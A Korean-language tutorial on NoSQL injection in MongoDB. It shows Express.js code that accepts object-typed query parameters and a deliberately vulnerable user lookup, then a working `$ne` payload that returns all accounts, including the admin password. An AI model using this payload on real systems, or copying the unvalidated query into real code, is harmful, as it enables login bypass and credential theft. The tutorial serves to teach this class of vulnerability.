# 서론

RDBMS의 경우 SQL을 이해하고 있다면, 모든 RDBMS에 대해 공격을 수행할 수 있지만, **NoSQL의 경우 사용하는 DBMS에 따라 요청 방식과 구조가 다르기 때문에 각각의 DBMS(MongoDB, CouchDB, Redis 등)에 대해 이해하고 있어야 한다.**

이번 글에서는 NRDBMS 중 `MongoDB`를 사용하며 발생할 수 있는 NoSQL Injection에 대해 알아보겠다.

# NoSQL Injection

NoSQL Injection도 이전에 배웠던 SQL Injection과 공격 목적 및 방법은 매우 유사하다.

두 공격 모두 **이용자의 입력 값이 동적으로 쿼리에 포함되면서 발생하는 취약점이다.**

MongoDB의 NoSQL Injection 취약점은 주로 이용자의 입력 값에 대한 검증이 불충분할 때 발생한다.

SQL은 저장하는 데이터의 자료형으로 `String`, `Integer`, `Date`, `Double` 등을 사용할 수 있다.

반면에 MongoDB의 경우 이 외에도 `Object`, `Array` 자료형을 추가적으로 사용할 수 있다. [MongoDB 자료형 공식 문서](https://docs.mongodb.com/manual/reference/operator/query/type/)

**오브젝트 타입**의 입력값을 처리할 때에는 **쿼리 연산자**를 사용할 수 있는데, 이를 통해 다양한 행위가 가능하다.

아래 코드는 `NodeJS`의 `Express` 프레임워크로 개발 된 예제 코드이다.

코드를 살펴보면, 이용자의 입력값과 타입을 추력하는데 `req.query`의 타입이 문자열로 지정되어 있지 않기 때문에, 문자열 외의 타입이 입력될 수 있다.

```
const express = require('express');
const app = express();

app.get('/', function(req,res) {
    console.log('data:', req.query.data);
    console.log('type:', typeof req.query.data);
    res.send('hello world');
});

const server = app.listen(3000, function(){
    console.log('app.listen');
});
```

아래는 파라미터인 `data`로 각각의 타입을 입력한 모습이다. 결과를 살펴보면, 일반적인 문자열 이외에 오브젝트 타입을 삽입할 수 있는 것을 확인할 수 있다.

```
http://localhost:3000/?data=1234
data: 1234
type: string

http://localhost:3000/?data[]=1234
data: [ '1234' ]
type: object

http://localhost:3000/?data[]=1234&data[]=5678
data: [ '1234', '5678' ] 
type: object

http://localhost:3000/?data[5678]=1234
data: { '5678': '1234' } 
type: object

http://localhost:3000/?data[5678]=1234&data=0000
data: { '5678': '1234', '0000': true } 
type: object

http://localhost:3000/?data[5678]=1234&data[]=0000
data: { '0': '0000', '5678': '1234' } 
type: object

http://localhost:3000/?data[5678]=1234&data[1111]=0000
data: { '1111': '0000', '5678': '1234' } 
type: object
```

MongoDB는 문자열이 아닌 타입의 값(`Object`)을 입력할 수 있고, 이를 통해 **쿼리 연산자**를 사용할 수 있다고 하였는데, 이를 통해 어떻게 NoSQL Injection 공격이 가능한지 살펴보자.

아래 코드는 `user` 컬렉션에서 이용자가 입력한 `uid`와 `upw`에 해당하는 데이터를 찾아 출력하는 예제 코드이다.\
(참고로 MongoDB에서 컬렉션에 대한 정의(스키마)는 필요 없지만, 데이터가 삽입될 때 필요한 컬렉션의 개념은 존재한다.)

코드를 살펴보면, 이용자의 입력값에 대해 타입을 검증하지 않기 때문에 오브젝트 타입의 값을 입력하여 연산자를 사용할 수 있다.

```
const express = require('express');
const app = express();
const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });

app.get('/query', function(req,res) {
    db.collection('user').find({
        'uid': req.query.uid,
        'upw': req.query.upw
    }).toArray(function(err, result) {
        if (err) throw err;
        res.send(result);
  });
});

const server = app.listen(3000, function(){
    console.log('app.listen');
});
```

오브젝트 타입의 값을 입력할 수 있다면 입력 값에 연산자를 사용할 수 있다고 하였다.

이전에 배웠던 `$ne` 연산자는 **not equal**의 약자로, 입력한 데이터와 일치하지 않는 데이터를 반환한다.

따라서 공격자는 계정 정보를 모르더라도, 아래와 같이 존재하지 않는 데이터를 입력하여 `"admin"`을 포함한 모든 계정의 정보를 알아낼 수 있게 된다.

```
http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a
=> [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]
```

위는 `$ne` 연산자를 사용해, `uid`와 `upw`가 `"a"`가 아닌 데이터를 조회하는 공격 쿼리의 실행 결과이다.
